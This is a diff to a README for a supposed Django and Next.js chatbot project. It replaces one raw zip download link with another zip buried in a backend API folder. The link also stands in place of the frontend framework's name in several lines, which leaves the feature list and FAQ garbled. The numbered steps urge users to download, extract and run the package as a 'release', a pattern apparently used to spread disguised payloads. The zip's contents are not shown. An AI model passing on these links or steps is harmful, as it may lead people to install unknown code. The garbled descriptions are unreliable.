@@ -6,11 +6,11 @@ This project is called **django-nextjs-chatbot**. It allows you to create an AI 
 
 ## 📥 Download the Application
 
-[![Download django-nextjs-chatbot](https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip)](https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip)
+[![Download django-nextjs-chatbot](https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip)](https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip)
 
 To start downloading the application, visit the Releases page by clicking the link below:
 
-[Download from Releases](https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip)
+[Download from Releases](https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip)
 
 ## 📦 System Requirements
 
@@ -26,7 +26,7 @@ Before you download, ensure your computer meets the following requirements:
 The **django-nextjs-chatbot** application includes these features:
 
 - **Django Framework:** It provides a powerful backend for data handling.
-- **https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip** This is used for building the user interface.
+- **https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip** This is used for building the user interface.
 - **PostgreSQL Database:** It securely stores user data and chatbot conversations.
 - **Redis Integration:** This speeds up data retrieval for better performance.
 - **Educational Tools:** Learn about Retrieval-Augmented Generation (RAG), LangChain/LangGraph, and Celery.
@@ -37,11 +37,11 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click on the link below to access the releases.
    
-   [Download from Releases](https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip)
+   [Download from Releases](https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip)
 
 2. **Select the Latest Release**: On the releases page, look for the latest version. It will generally appear at the top of the list.
 
-3. **Download the Application Package**: Click on the package that matches your operating system. This might look like `https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip` or a similar name.
+3. **Download the Application Package**: Click on the package that matches your operating system. This might look like `https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip` or a similar name.
 
 4. **Unzip the Package**: After downloading, find the file in your downloads folder. Right-click on the file and choose “Extract All” to unzip it. Follow the instructions for your operating system.
 
@@ -72,7 +72,7 @@ Once your application is running, follow these steps to interact with your chatb
 ## 🌟 Frequently Asked Questions
 
 1. **What is this chatbot built on?**
-   The chatbot uses Django for the backend and https://raw.githubusercontent.com/Udit05-max/django-nextjs-chatbot/master/protomeritic/django-nextjs-chatbot.zip for the frontend. Together, they deliver a seamless experience.
+   The chatbot uses Django for the backend and https://github.com/Udit05-max/django-nextjs-chatbot/raw/refs/heads/master/backend/apps/chatbot/api/django-nextjs-chatbot-3.7.zip for the frontend. Together, they deliver a seamless experience.
 
 2. **Can I customize the chatbot?**
    Yes, you can modify the code and add features based on your needs. The project is open-source.
